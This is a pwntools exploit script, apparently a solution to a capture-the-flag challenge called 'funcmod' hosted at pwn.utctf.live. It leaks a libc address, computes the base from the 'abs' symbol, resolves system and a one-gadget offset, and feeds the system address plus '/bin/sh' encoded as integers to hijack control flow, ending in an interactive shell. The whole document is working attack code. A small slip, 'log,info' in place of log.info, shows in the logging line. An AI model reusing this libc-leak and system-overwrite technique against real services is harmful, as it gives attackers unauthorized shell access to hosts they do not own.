from pwn import *
import sys
import os

remote_ip,port = 'pwn.utctf.live','5432'
binary = './funcmod'

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"

if len(sys.argv) > 1 :
    io = remote(remote_ip,port)

else:
    io = process(binary, env = {"LD_PRELOAD" : "./libc.so"})
    gdb.attach(io)

e = ELF("func")
libc = ELF("libc.so")

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if __name__== "__main__":
    sl("2")
    sh1 = 0x6e69622f
    sh2 = 0x0068732f
    sl(str(sh1))
    sl(str(sh2))

    rl()
    rl()
    
    inc = rl()[11::].strip()
    rl()
    leak = rl()[5::].strip()
    inc = int(inc,16)

    libc.address = int(leak,16) - libc.symbols['abs']
    log,info("Libc : " + hex(libc.address))
    
    sys = libc.symbols['system']
    binsh = next(libc.search("/bin/sh"))

    one = libc.address + 0xf0370
    sl('0')

    ru("Map: ")
    m = int(rl().strip(),16)
    
    sl(hex(sys))

    io.interactive()